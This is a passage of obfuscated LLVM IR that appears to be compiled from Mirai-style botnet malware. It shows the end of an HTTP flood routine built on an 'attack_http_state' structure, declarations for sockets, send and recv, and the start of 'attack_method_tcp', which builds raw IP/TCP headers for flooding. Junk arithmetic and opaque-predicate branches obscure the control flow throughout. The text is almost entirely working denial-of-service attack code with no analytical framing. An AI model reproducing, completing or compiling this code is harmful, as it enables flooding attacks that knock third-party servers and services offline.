originalBB438alteredBB:                           ; preds = %originalBB438, %2614
  br label %originalBB438

originalBB442alteredBB:                           ; preds = %originalBB442, %2634
  br label %originalBB442

originalBB446alteredBB:                           ; preds = %originalBB446, %2651
  %4498 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4499 = load i32, i32* %12, align 4
  %4500 = call i8* @table_retrieve_val(i32 53, i32* null)
  %4501 = call i32 @util_stristr(i8* %4498, i32 %4499, i8* %4500)
  %4502 = icmp ne i32 %4501, -1
  br label %originalBB446

originalBB450alteredBB:                           ; preds = %originalBB450, %2684
  %4503 = load i32, i32* %55, align 4
  %_451 = sub i32 0, %4503
  %gen452 = add i32 %_451, 1
  %4504 = add nsw i32 %4503, 1
  store i32 %4504, i32* %55, align 4
  br label %originalBB450

originalBB456alteredBB:                           ; preds = %originalBB456, %2703
  %4505 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4506 = load i32, i32* %55, align 4
  %4507 = sext i32 %4506 to i64
  %4508 = getelementptr inbounds i8, i8* %4505, i64 %4507
  %4509 = load i32, i32* %12, align 4
  %4510 = load i32, i32* %55, align 4
  %_457 = sub i32 %4509, %4510
  %gen458 = mul i32 %_457, %4510
  %_459 = sub i32 0, %4509
  %gen460 = add i32 %_459, %4510
  %_461 = sub i32 %4509, %4510
  %gen462 = mul i32 %_461, %4510
  %_463 = shl i32 %4509, %4510
  %_464 = shl i32 %4509, %4510
  %_465 = sub i32 %4509, %4510
  %gen466 = mul i32 %_465, %4510
  %_467 = sub i32 %4509, %4510
  %gen468 = mul i32 %_467, %4510
  %_469 = sub i32 %4509, %4510
  %gen470 = mul i32 %_469, %4510
  %_471 = shl i32 %4509, %4510
  %4511 = sub nsw i32 %4509, %4510
  %4512 = call i32 @util_memsearch(i8* %4508, i32 %4511, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %4512, i32* %56, align 4
  %4513 = load i32, i32* %56, align 4
  %4514 = icmp ne i32 %4513, -1
  br label %originalBB456

originalBB475alteredBB:                           ; preds = %originalBB475, %2773
  %4515 = load i32, i32* %10, align 4
  %_476 = shl i32 %4515, 1
  %_477 = sub i32 %4515, 1
  %gen478 = mul i32 %_477, 1
  %4516 = add nsw i32 %4515, 1
  store i32 %4516, i32* %10, align 4
  br label %originalBB475

originalBB482alteredBB:                           ; preds = %originalBB482, %2817
  %4517 = load i8*, i8** %57, align 8
  %4518 = load i32, i32* %10, align 4
  %4519 = sext i32 %4518 to i64
  %4520 = getelementptr inbounds i8, i8* %4517, i64 %4519
  %4521 = load i8*, i8** %57, align 8
  %4522 = load i32, i32* %10, align 4
  %4523 = sext i32 %4522 to i64
  %4524 = getelementptr inbounds i8, i8* %4521, i64 %4523
  %4525 = call i32 @util_strlen(i8* %4524)
  %4526 = call i32 @util_stristr(i8* %4520, i32 %4525, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %4527 = icmp ne i32 %4526, -1
  br label %originalBB482

originalBB486alteredBB:                           ; preds = %originalBB486, %2845
  %4528 = load i8*, i8** %57, align 8
  %4529 = load i32, i32* %10, align 4
  %4530 = sext i32 %4529 to i64
  %4531 = getelementptr inbounds i8, i8* %4528, i64 %4530
  %4532 = load i8*, i8** %57, align 8
  %4533 = load i32, i32* %10, align 4
  %4534 = sext i32 %4533 to i64
  %4535 = getelementptr inbounds i8, i8* %4532, i64 %4534
  %4536 = call i32 @util_strlen(i8* %4535)
  %4537 = call i32 @util_stristr(i8* %4531, i32 %4536, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %4538 = load i32, i32* %10, align 4
  %_487 = shl i32 %4538, %4537
  %_488 = sub i32 %4538, %4537
  %gen489 = mul i32 %_488, %4537
  %_490 = shl i32 %4538, %4537
  %_491 = sub i32 0, %4538
  %gen492 = add i32 %_491, %4537
  %_493 = shl i32 %4538, %4537
  %_494 = shl i32 %4538, %4537
  %_495 = sub i32 %4538, %4537
  %gen496 = mul i32 %_495, %4537
  %4539 = add nsw i32 %4538, %4537
  store i32 %4539, i32* %10, align 4
  br label %originalBB486

originalBB500alteredBB:                           ; preds = %originalBB500, %2920
  %4540 = load i32, i32* %58, align 4
  %4541 = icmp slt i32 %4540, 10
  br label %originalBB500

originalBB504alteredBB:                           ; preds = %originalBB504, %2939
  %4542 = load i32, i32* %27, align 4
  %4543 = load i32, i32* %58, align 4
  %_505 = shl i32 %4542, %4543
  %_506 = shl i32 %4542, %4543
  %_507 = shl i32 %4542, %4543
  %_508 = shl i32 %4542, %4543
  %_509 = sub i32 0, %4542
  %gen510 = add i32 %_509, %4543
  %4544 = add i32 %4542, %4543
  %4545 = zext i32 %4544 to i64
  %4546 = call i64 @time(i64* null) #6
  %4547 = icmp sgt i64 %4545, %4546
  br label %originalBB504

originalBB514alteredBB:                           ; preds = %originalBB514, %2976
  store i32 7, i32* %10, align 4
  %4548 = load i8*, i8** %57, align 8
  %4549 = getelementptr inbounds i8, i8* %4548, i64 4
  %4550 = load i8, i8* %4549, align 1
  %4551 = sext i8 %4550 to i32
  %4552 = icmp eq i32 %4551, 115
  br label %originalBB514

originalBB518alteredBB:                           ; preds = %originalBB518, %2998
  %4553 = load i32, i32* %10, align 4
  %_519 = sub i32 0, %4553
  %gen520 = add i32 %_519, 1
  %_521 = sub i32 0, %4553
  %gen522 = add i32 %_521, 1
  %4554 = add nsw i32 %4553, 1
  store i32 %4554, i32* %10, align 4
  br label %originalBB518

originalBB526alteredBB:                           ; preds = %originalBB526, %3048
  %4555 = load i32, i32* %10, align 4
  %_527 = sub i32 %4555, 1
  %gen528 = mul i32 %_527, 1
  %_529 = sub i32 0, %4555
  %gen530 = add i32 %_529, 1
  %_531 = shl i32 %4555, 1
  %_532 = sub i32 %4555, 1
  %gen533 = mul i32 %_532, 1
  %4556 = add nsw i32 %4555, 1
  store i32 %4556, i32* %10, align 4
  br label %originalBB526

originalBB537alteredBB:                           ; preds = %originalBB537, %3081
  %4557 = load i8*, i8** %57, align 8
  %4558 = load i32, i32* %10, align 4
  %_538 = sub i32 %4558, 1
  %gen539 = mul i32 %_538, 1
  %_540 = shl i32 %4558, 1
  %_541 = sub i32 0, %4558
  %gen542 = add i32 %_541, 1
  %4559 = add nsw i32 %4558, 1
  %4560 = sext i32 %4559 to i64
  %4561 = getelementptr inbounds i8, i8* %4557, i64 %4560
  %4562 = call i32 @util_strlen(i8* %4561)
  %4563 = icmp slt i32 %4562, 256
  br label %originalBB537

originalBB546alteredBB:                           ; preds = %originalBB546, %3129
  br label %originalBB546

originalBB550alteredBB:                           ; preds = %originalBB550, %3160
  %4564 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4565 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4564, i32 0, i32 6
  %4566 = getelementptr inbounds [257 x i8], [257 x i8]* %4565, i32 0, i32 0
  %4567 = getelementptr inbounds i8, i8* %4566, i64 1
  call void @util_zero(i8* %4567, i32 255)
  %4568 = load i8*, i8** %57, align 8
  %4569 = load i32, i32* %10, align 4
  %_551 = sub i32 %4569, 1
  %gen552 = mul i32 %_551, 1
  %_553 = shl i32 %4569, 1
  %_554 = shl i32 %4569, 1
  %_555 = shl i32 %4569, 1
  %_556 = sub i32 %4569, 1
  %gen557 = mul i32 %_556, 1
  %_558 = sub i32 %4569, 1
  %gen559 = mul i32 %_558, 1
  %_560 = sub i32 %4569, 1
  %gen561 = mul i32 %_560, 1
  %4570 = add nsw i32 %4569, 1
  %4571 = sext i32 %4570 to i64
  %4572 = getelementptr inbounds i8, i8* %4568, i64 %4571
  %4573 = call i32 @util_strlen(i8* %4572)
  %4574 = icmp sgt i32 %4573, 0
  br label %originalBB550

originalBB565alteredBB:                           ; preds = %originalBB565, %3199
  br label %originalBB565

originalBB569alteredBB:                           ; preds = %originalBB569, %3216
  br label %originalBB569

originalBB573alteredBB:                           ; preds = %originalBB573, %3233
  br label %originalBB573

originalBB577alteredBB:                           ; preds = %originalBB577, %3250
  %4575 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4576 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4575, i32 0, i32 9
  %4577 = getelementptr inbounds [9 x i8], [9 x i8]* %4576, i32 0, i32 0
  %4578 = call i8* @strcpy(i8* %4577, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0)) #6
  %4579 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4580 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4579, i32 0, i32 1
  store i8 10, i8* %4580, align 4
  br label %originalBB577

originalBB581alteredBB:                           ; preds = %originalBB581, %3274
  br label %originalBB581

originalBB585alteredBB:                           ; preds = %originalBB585, %3315
  %4581 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4582 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4581, i32 0, i32 1
  store i8 10, i8* %4582, align 4
  br label %originalBB585

originalBB589alteredBB:                           ; preds = %originalBB589, %3334
  %4583 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4584 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4583, i32 0, i32 1
  store i8 1, i8* %4584, align 4
  br label %originalBB589

originalBB593alteredBB:                           ; preds = %originalBB593, %3418
  %4585 = load i32, i32* %12, align 4
  %4586 = icmp eq i32 %4585, -1
  br label %originalBB593

originalBB597alteredBB:                           ; preds = %originalBB597, %3445
  %4587 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4588 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4587, i32 0, i32 0
  %4589 = load i32, i32* %4588, align 4
  %4590 = call i32 @close(i32 %4589)
  %4591 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4592 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4591, i32 0, i32 0
  store i32 -1, i32* %4592, align 4
  %4593 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4594 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4593, i32 0, i32 1
  store i8 0, i8* %4594, align 4
  br label %originalBB597

originalBB601alteredBB:                           ; preds = %originalBB601, %3480
  store i32 0, i32* %59, align 4
  %4595 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4596 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4595, i32 0, i32 14
  %4597 = load i32, i32* %4596, align 4
  %4598 = icmp sgt i32 %4597, 0
  br label %originalBB601

originalBB605alteredBB:                           ; preds = %originalBB605, %3501
  %4599 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4600 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4599, i32 0, i32 14
  %4601 = load i32, i32* %4600, align 4
  %4602 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4603 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4602, i32 0, i32 17
  %4604 = load i32, i32* %4603, align 4
  %4605 = icmp sgt i32 %4601, %4604
  br label %originalBB605

originalBB609alteredBB:                           ; preds = %originalBB609, %3525
  %4606 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4607 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4606, i32 0, i32 17
  %4608 = load i32, i32* %4607, align 4
  br label %originalBB609

originalBB613alteredBB:                           ; preds = %originalBB613, %3549
  store i32 %3550, i32* %59, align 4
  %4609 = load i32, i32* %59, align 4
  %4610 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4611 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4610, i32 0, i32 14
  %4612 = load i32, i32* %4611, align 4
  %_614 = sub i32 0, %4612
  %gen615 = add i32 %_614, %4609
  %_616 = shl i32 %4612, %4609
  %_617 = sub i32 0, %4612
  %gen618 = add i32 %_617, %4609
  %_619 = shl i32 %4612, %4609
  %4613 = sub nsw i32 %4612, %4609
  store i32 %4613, i32* %4611, align 4
  %4614 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4615 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4614, i32 0, i32 11
  %4616 = load i32, i32* %4615, align 4
  %4617 = icmp eq i32 %4616, 1
  br label %originalBB613

originalBB623alteredBB:                           ; preds = %originalBB623, %3626
  %4618 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4619 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4618, i32 0, i32 16
  %4620 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4621 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4620, i32 0, i32 15
  %4622 = load i32, i32* %4621, align 4
  %4623 = sext i32 %4622 to i64
  %4624 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %4619, i64 0, i64 %4623
  %4625 = getelementptr inbounds [128 x i8], [128 x i8]* %4624, i32 0, i32 0
  %4626 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4627 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4626, i32 0, i32 18
  %4628 = load i32, i32* %60, align 4
  %4629 = sext i32 %4628 to i64
  %4630 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4627, i64 0, i64 %4629
  %4631 = call i32 @util_strcpy(i8* %4625, i8* %4630)
  %4632 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4633 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4632, i32 0, i32 16
  %4634 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4635 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4634, i32 0, i32 15
  %4636 = load i32, i32* %4635, align 4
  %4637 = sext i32 %4636 to i64
  %4638 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %4633, i64 0, i64 %4637
  %4639 = getelementptr inbounds [128 x i8], [128 x i8]* %4638, i32 0, i32 0
  %4640 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4641 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4640, i32 0, i32 16
  %4642 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4643 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4642, i32 0, i32 15
  %4644 = load i32, i32* %4643, align 4
  %4645 = sext i32 %4644 to i64
  %4646 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %4641, i64 0, i64 %4645
  %4647 = getelementptr inbounds [128 x i8], [128 x i8]* %4646, i32 0, i32 0
  %4648 = call i32 @util_strlen(i8* %4647)
  %4649 = sext i32 %4648 to i64
  %4650 = getelementptr inbounds i8, i8* %4639, i64 %4649
  %4651 = call i32 @util_strcpy(i8* %4650, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i32 0, i32 0))
  %4652 = load i32, i32* %61, align 4
  %_624 = shl i32 %4652, 3
  %_625 = sub i32 0, %4652
  %gen626 = add i32 %_625, 3
  %_627 = shl i32 %4652, 3
  %_628 = shl i32 %4652, 3
  %_629 = shl i32 %4652, 3
  %_630 = sub i32 %4652, 3
  %gen631 = mul i32 %_630, 3
  %_632 = sub i32 %4652, 3
  %gen633 = mul i32 %_632, 3
  %4653 = add nsw i32 %4652, 3
  %4654 = load i32, i32* %60, align 4
  %_634 = sub i32 %4654, %4653
  %gen635 = mul i32 %_634, %4653
  %_636 = sub i32 0, %4654
  %gen637 = add i32 %_636, %4653
  %_638 = sub i32 0, %4654
  %gen639 = add i32 %_638, %4653
  %_640 = sub i32 %4654, %4653
  %gen641 = mul i32 %_640, %4653
  %_642 = sub i32 %4654, %4653
  %gen643 = mul i32 %_642, %4653
  %_644 = sub i32 0, %4654
  %gen645 = add i32 %_644, %4653
  %_646 = sub i32 %4654, %4653
  %gen647 = mul i32 %_646, %4653
  %4655 = add nsw i32 %4654, %4653
  store i32 %4655, i32* %60, align 4
  %4656 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4657 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4656, i32 0, i32 18
  %4658 = load i32, i32* %60, align 4
  %4659 = sext i32 %4658 to i64
  %4660 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4657, i64 0, i64 %4659
  %4661 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4662 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4661, i32 0, i32 17
  %4663 = load i32, i32* %4662, align 4
  %4664 = load i32, i32* %60, align 4
  %_648 = sub i32 0, %4663
  %gen649 = add i32 %_648, %4664
  %_650 = shl i32 %4663, %4664
  %_651 = shl i32 %4663, %4664
  %4665 = sub nsw i32 %4663, %4664
  %4666 = call i32 @util_memsearch(i8* %4660, i32 %4665, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %4666, i32* %61, align 4
  %4667 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4668 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4667, i32 0, i32 18
  %4669 = load i32, i32* %60, align 4
  %4670 = load i32, i32* %61, align 4
  %_652 = sub i32 0, %4670
  %gen653 = add i32 %_652, 1
  %4671 = sub nsw i32 %4670, 1
  %_654 = sub i32 %4669, %4671
  %gen655 = mul i32 %_654, %4671
  %_656 = shl i32 %4669, %4671
  %4672 = add nsw i32 %4669, %4671
  %4673 = sext i32 %4672 to i64
  %4674 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4668, i64 0, i64 %4673
  store i8 0, i8* %4674, align 1
  %4675 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4676 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4675, i32 0, i32 16
  %4677 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4678 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4677, i32 0, i32 15
  %4679 = load i32, i32* %4678, align 4
  %4680 = sext i32 %4679 to i64
  %4681 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %4676, i64 0, i64 %4680
  %4682 = getelementptr inbounds [128 x i8], [128 x i8]* %4681, i32 0, i32 0
  %4683 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4684 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4683, i32 0, i32 16
  %4685 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4686 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4685, i32 0, i32 15
  %4687 = load i32, i32* %4686, align 4
  %4688 = sext i32 %4687 to i64
  %4689 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %4684, i64 0, i64 %4688
  %4690 = getelementptr inbounds [128 x i8], [128 x i8]* %4689, i32 0, i32 0
  %4691 = call i32 @util_strlen(i8* %4690)
  %4692 = sext i32 %4691 to i64
  %4693 = getelementptr inbounds i8, i8* %4682, i64 %4692
  %4694 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4695 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4694, i32 0, i32 18
  %4696 = load i32, i32* %60, align 4
  %4697 = sext i32 %4696 to i64
  %4698 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4695, i64 0, i64 %4697
  %4699 = call i32 @util_strcpy(i8* %4693, i8* %4698)
  %4700 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4701 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4700, i32 0, i32 15
  %4702 = load i32, i32* %4701, align 4
  %_657 = sub i32 0, %4702
  %gen658 = add i32 %_657, 1
  %_659 = sub i32 %4702, 1
  %gen660 = mul i32 %_659, 1
  %_661 = shl i32 %4702, 1
  %_662 = sub i32 %4702, 1
  %gen663 = mul i32 %_662, 1
  %4703 = add nsw i32 %4702, 1
  store i32 %4703, i32* %4701, align 4
  br label %originalBB623

originalBB667alteredBB:                           ; preds = %originalBB667, %3729
  %4704 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4705 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4704, i32 0, i32 14
  store i32 -1, i32* %4705, align 4
  %4706 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4707 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4706, i32 0, i32 1
  store i8 10, i8* %4707, align 4
  br label %originalBB667

originalBB671alteredBB:                           ; preds = %originalBB671, %3750
  br label %originalBB671

originalBB675alteredBB:                           ; preds = %originalBB675, %3807
  %4708 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4709 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4708, i32 0, i32 18
  %4710 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4711 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4710, i32 0, i32 18
  %4712 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4711, i32 0, i32 0
  %4713 = load i32, i32* %62, align 4
  %4714 = call i32 @util_memsearch(i8* %4712, i32 %4713, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %4715 = sext i32 %4714 to i64
  %4716 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4709, i64 0, i64 %4715
  store i8 0, i8* %4716, align 1
  br label %originalBB675

originalBB679alteredBB:                           ; preds = %originalBB679, %3840
  %4717 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4718 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4717, i32 0, i32 1
  store i8 1, i8* %4718, align 4
  br label %originalBB679

originalBB683alteredBB:                           ; preds = %originalBB683, %3859
  %4719 = load i32, i32* %63, align 4
  %_684 = sub i32 0, %4719
  %gen685 = add i32 %_684, 2
  %_686 = shl i32 %4719, 2
  %_687 = sub i32 %4719, 2
  %gen688 = mul i32 %_687, 2
  %_689 = sub i32 0, %4719
  %gen690 = add i32 %_689, 2
  %_691 = shl i32 %4719, 2
  %4720 = add nsw i32 %4719, 2
  %4721 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4722 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4721, i32 0, i32 14
  store i32 %4720, i32* %4722, align 4
  %4723 = load i32, i32* %62, align 4
  store i32 %4723, i32* %59, align 4
  br label %originalBB683

originalBB695alteredBB:                           ; preds = %originalBB695, %3898
  br label %originalBB695

originalBB699alteredBB:                           ; preds = %originalBB699, %3915
  %4724 = load i32, i32* %59, align 4
  %4725 = icmp eq i32 %4724, 0
  br label %originalBB699

originalBB703alteredBB:                           ; preds = %originalBB703, %3934
  br label %originalBB703

originalBB707alteredBB:                           ; preds = %originalBB707, %3992
  br label %originalBB707

originalBB711alteredBB:                           ; preds = %originalBB711, %4021
  %4726 = load i32, i32* %12, align 4
  %4727 = icmp eq i32 %4726, -1
  br label %originalBB711

originalBB715alteredBB:                           ; preds = %originalBB715, %4048
  %4728 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4729 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4728, i32 0, i32 0
  %4730 = load i32, i32* %4729, align 4
  %4731 = call i32 @close(i32 %4730)
  %4732 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4733 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4732, i32 0, i32 0
  store i32 -1, i32* %4733, align 4
  %4734 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4735 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4734, i32 0, i32 1
  store i8 0, i8* %4735, align 4
  br label %originalBB715

originalBB719alteredBB:                           ; preds = %originalBB719, %4081
  %4736 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4737 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4736, i32 0, i32 1
  store i8 1, i8* %4737, align 4
  br label %originalBB719

originalBB723alteredBB:                           ; preds = %originalBB723, %4101
  br label %originalBB723

originalBB727alteredBB:                           ; preds = %originalBB727, %4121
  %4738 = load i32, i32* %9, align 4
  %_728 = sub i32 0, %4738
  %gen729 = add i32 %_728, 1
  %_730 = sub i32 0, %4738
  %gen731 = add i32 %_730, 1
  %_732 = sub i32 0, %4738
  %gen733 = add i32 %_732, 1
  %_734 = sub i32 %4738, 1
  %gen735 = mul i32 %_734, 1
  %_736 = sub i32 %4738, 1
  %gen737 = mul i32 %_736, 1
  %_738 = sub i32 %4738, 1
  %gen739 = mul i32 %_738, 1
  %4739 = add nsw i32 %4738, 1
  store i32 %4739, i32* %9, align 4
  br label %originalBB727
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i32 @util_strlen(i8*) #3

declare void @table_unlock_val(i8 zeroext) #3

declare i32 @util_strcpy(i8*, i8*) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

declare i32 @rand_next() #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

declare i8* @table_retrieve_val(i32, i32*) #3

declare void @table_lock_val(i8 zeroext) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare void @util_zero(i8*, i32) #3

declare i8* @util_itoa(i32, i32, i8*) #3

declare signext i8 @util_strcmp(i8*, i8*) #3

declare i64 @send(i32, i8*, i64, i32) #3

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare i64 @recv(i32, i8*, i64, i32) #3

declare i32 @util_memsearch(i8*, i32, i8*, i32) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

declare signext i8 @util_strncmp(i8*, i8*, i32) #3

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = load i32, i32* @x.19
  %6 = load i32, i32* @y.20
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8, align 1
  %14 = alloca %struct.attack_target*, align 8
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_option*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8**, align 8
  %20 = alloca i8, align 1
  %21 = alloca i16, align 2
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i16, align 2
  %25 = alloca i16, align 2
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8, align 1
  %29 = alloca i8, align 1
  %30 = alloca i8, align 1
  %31 = alloca i8, align 1
  %32 = alloca i8, align 1
  %33 = alloca i8, align 1
  %34 = alloca i32, align 4
  %35 = alloca %struct.iphdr*, align 8
  %36 = alloca %struct.tcphdr*, align 8
  %37 = alloca i8*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca %struct.iphdr*, align 8
  %40 = alloca %struct.tcphdr*, align 8
  %41 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %13, align 1
  store %struct.attack_target* %1, %struct.attack_target** %14, align 8
  store i8 %2, i8* %15, align 1
  store %struct.attack_option* %3, %struct.attack_option** %16, align 8
  %42 = load i8, i8* %13, align 1
  %43 = zext i8 %42 to i64
  %44 = call noalias i8* @calloc(i64 %43, i64 8) #6
  %45 = bitcast i8* %44 to i8**
  store i8** %45, i8*** %19, align 8
  %46 = load i8, i8* %15, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 2, i32 0)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %20, align 1
  %50 = load i8, i8* %15, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 3, i32 65535)
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %21, align 2
  %54 = load i8, i8* %15, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 4, i32 64)
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %22, align 1
  %58 = load i8, i8* %15, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 5, i32 1)
  %61 = trunc i32 %60 to i8
